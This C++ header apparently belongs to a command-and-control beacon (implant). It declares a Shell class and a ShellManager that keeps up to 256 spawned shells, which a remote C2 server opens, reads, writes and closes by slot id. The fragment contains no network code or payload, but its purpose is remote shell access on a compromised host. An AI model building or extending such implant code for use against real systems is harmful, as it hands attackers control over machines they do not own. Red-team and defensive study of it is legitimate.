#pragma once

#include "runtime.h"

class Shell
{
private:
    ShellProcess shellProcess;
    Shell(ShellProcess &&sp) noexcept;

public:
    static Result<Shell, Error> Create() noexcept;
    Result<USIZE, Error> Write(const char *data, USIZE length) noexcept;
    Result<USIZE, Error> Read(PCHAR buffer, USIZE capacity) noexcept;

    ~Shell() noexcept = default;
    Shell(Shell &&other) noexcept;
    Shell &operator=(Shell &&) = delete;
    Shell(const Shell &) = delete;
    Shell &operator=(const Shell &) = delete;
};

/// Shell identifier exchanged with the C2 over the wire. Stored as a 64-bit
/// value for scalability and to match pointer width, so a future revision can
/// ship an opaque handle (e.g. a pointer) instead of a slot index without
/// resizing the wire field. Today the value is the slot index (0..MAX_STREAMS-1).
using ShellId = UINT64;

/**
 * @class ShellManager
 * @brief Owns a fixed pool of independent shells keyed by server-assigned slot id.
 *
 * @details The beacon owns slot assignment: Open() scans for the first free
 * (null) slot, spawns a shell there, and returns that slot id to the caller.
 * The C2 must reuse the returned id for Read/Write/Close rather than choosing
 * its own — this lets the beacon hand out ids without collisions across
 * concurrent consumers. A shell is destroyed with Close() or in the destructor,
 * which frees its slot for reuse. Encapsulates the per-slot shells so Context
 * holds a single member rather than a raw array.
 */
class ShellManager
{
private:
    static constexpr USIZE MAX_STREAMS = 256; ///< Size of the shell slot pool (ids 0..255)
    Shell *shells[MAX_STREAMS] = {};          ///< Slot table; null == free

public:
    ShellManager() = default;

    ~ShellManager()
    {
        for (USIZE i = 0; i < MAX_STREAMS; i++)
        {
            if (shells[i] != nullptr)
            {
                delete shells[i];
                shells[i] = nullptr;
            }
        }
    }

    ShellManager(const ShellManager &) = delete;
    ShellManager &operator=(const ShellManager &) = delete;

    /// Look up an already-open shell by id. Never spawns.
    /// @return The shell, or nullptr if id is invalid or no shell is open.
    Shell *Get(ShellId shellId)
    {
        if (shellId >= MAX_STREAMS)
            return nullptr;
        return shells[shellId];
    }

    /// Open (spawn) a shell in the first free slot. The beacon owns slot
    /// assignment: the caller must use the returned id for Read/Write/Close.
    /// @return Ok(shellId) on success; Err(ShellProcess_CreateFailed) if spawn
    ///         failed (slot left free); Err(Shell_NoFreeSlot) if the pool is full.
    Result<ShellId, Error> Open()
    {
        for (USIZE i = 0; i < MAX_STREAMS; i++)
        {
            if (shells[i] != nullptr)
                continue;

            auto shellResult = Shell::Create();
            if (!shellResult)
                return Result<ShellId, Error>::Err(shellResult, Error::ShellProcess_CreateFailed);
            shells[i] = new Shell(static_cast<Shell &&>(shellResult.Value()));
            return Result<ShellId, Error>::Ok((ShellId)i);
        }
        return Result<ShellId, Error>::Err(Error::Shell_NoFreeSlot);
    }

    /// Destroy a shell by id (idempotent — safe if it was never opened).
    VOID Close(ShellId shellId)
    {
        if (shellId >= MAX_STREAMS)
            return;
        if (shells[shellId] != nullptr)
        {
            delete shells[shellId];
            shells[shellId] = nullptr;
        }
    }
};
